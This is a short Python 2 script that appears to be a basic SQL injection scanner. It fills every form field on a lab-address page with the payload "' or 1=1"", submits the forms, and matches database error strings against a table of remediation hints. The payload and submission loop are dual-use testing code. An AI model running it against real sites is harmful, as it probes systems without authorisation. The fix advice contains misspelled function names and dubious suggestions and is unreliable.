import urllib2
import re
import mechanize

SQLeD = {'MySQL. The possible Solution is:- Check the user input by passing it through the following code:- Try sprintf(myql_real_escape_string(queryparam))': 'error in your SQL syntax',
         'SQLi_err. The possible Solution is:- Check the user input by passing it through the following code:- Try sprintf(myql_real_escape_string(queryparam)) ': 'access shop category information',
         'MySQL_fetch. The possible Solution is:- Check the user input by passing it through the following code:- Try sprintf(myql_real_escape_string(queryparam)) ': 'mysql_fetch_assoc()',
         'MySQL_array. The possible Solution is:- Check the user input by passing it through the following code:- Try sprintf(myql_real_escape_string(queryparam)) ': 'mysql_fetch_array()',
         'MySQL_result. The possible Solution is:- Check the user input by passing it through the following code:- Try sprintf(myql_real_escape_string(queryparam)) ': 'mysql_free_result()',
         'MySQL_start. The possible Solution is:- Check the user input by passing it through the following code:- Try sprintf(myql_real_escape_string(queryparam)) ': 'session_start()',
         'MYSQL. The possible Solution is:- Check the user input by passing it through the following code:- Try sprintf(myql_real_escape_string(queryparam)) ': 'getimagesize()',
         'MySQL_call. The possible Solution is:- Check the user input by passing it through the following code:- Try sprintf(myql_real_escape_string(queryparam)) ': 'Call to a member function',
         'Oracle1. The possible Solution is:- Check the user input by passing it through the following code:- Try ESPI.encoder().encodeForSQL(new OraclerCodec(), queryparam)': 'Microsoft OLE DB Provider for Oracle',
         'Mysql_re. The possible Solution is:- Check the user input by passing it through the following code:- Try sprintf(myql_real_escape_string(queryparam))': 'Warning: require()',
         'MysQLi. The possible Solution is:- Check the user input by passing it through the following code:- Try sprintf(myql_real_escape_string(queryparam))': 'mysql_query()',
         'Oracle. The possible Solution is:- Check the user input by passing it through the following code:- Try ESPI.encoder().encodeForSQL(new OraclerCodec(), queryparam)': 'ORA-01756',
         'MiscError. The possible Solution is:- Check the user input by passing it through the following code:- Try sprintf(myql_real_escape_string(queryparam)) ': 'SQL Error',
         'MiscError2. The possible Solution is:- Check the user input by passing it through the following code:- Try sprintf(myql_real_escape_string(queryparam)) ': 'mysql_fetch_row',
         'MiscError3. The possible Solution is:- Check the user input by passing it through the following code:- Try sprintf(myql_real_escape_string(queryparam)) ': 'num_rows',
         'JDBC_CFM. The possible Solution is:- Check the user input by passing it through the following code:- Try sprintf(myql_real_escape_string(queryparam)) ': 'Error Executing Database Query',
         'JDBC_CFM2. The possible Solution is:- Check the user input by passing it through the following code:- Try sprintf(myql_real_escape_string(queryparam)) ': 'SQLServer JDBC Driver',
         'MSSQL_OLEdb. The possible Solution is:- Check the user input by passing it through the following code:- Try sprintf(myql_real_escape_string(queryparam)) ': 'Mircrosoft OLE DB Provider for SQL Server',
         'MSSQL_Uqm. The possible Solution is:- Check the user input by passing it through the following code:- Try sprintf(myql_real_escape_string(queryparam)) ': 'Unclosed quotation mark',
         'MS-Access_ODBC. The possible Solution is:- Check the user input by passing it through the following code:- Try sprintf(myql_real_escape_string(queryparam)) ': 'ODBC Microsoft Access Driver',
         'Postgrey_error. The possible Solution is:- Check the user input by passing it through the following code:- Try sprintf(myql_real_escape_string(queryparam)) ': 'An error occured',
         'SQL_errore. The possible Solution is:- Check the user input by passing it through the following code:- Try sprintf(myql_real_escape_string(queryparam)) ': 'Unknown Column',
         'MS-Access_JETdb. The possible Solution is:- Check the user input by passing it through the following code:- Try sprintf(myql_real_escape_string(queryparam)) ': 'Microsoft JET Database'}

host="http://192.168.173.131/nss"
print "\n[+]URL WITH PAYLOAD :",host
br=mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(False)
response = br.open(host)
flist=list(br.forms())
for i in flist:
    br.form=i
    print br.form
    br.set_all_readonly(False)
    j=1
    for control in br.form.controls:
        if(control.name!=None):
            try:
                br.form[control.name]="' or 1=1\""
            except:
                "Found Dynamic Content"
        else:
            try:
                control.value="' or 1=1\""
            except:
                "Found Dynamic Content"
    try:
        response=br.submit()
        r=response.read()
        #print r
        for type,eMSG in SQLeD.items():
            try:
                if re.search(eMSG,r):
                    print "\n[+]SQL INJECTION BUG FOUND ERROR TYPE IS:", type
                    break
                else:
                    print "\ntrying for sql injection error: ",j
                j=j+1
            except:
                "PLEASE START INTERNET"
    except:
        print "Found Dynamic Content"
    try:
        br.back()
    except:
        "Found Dynamic Content"
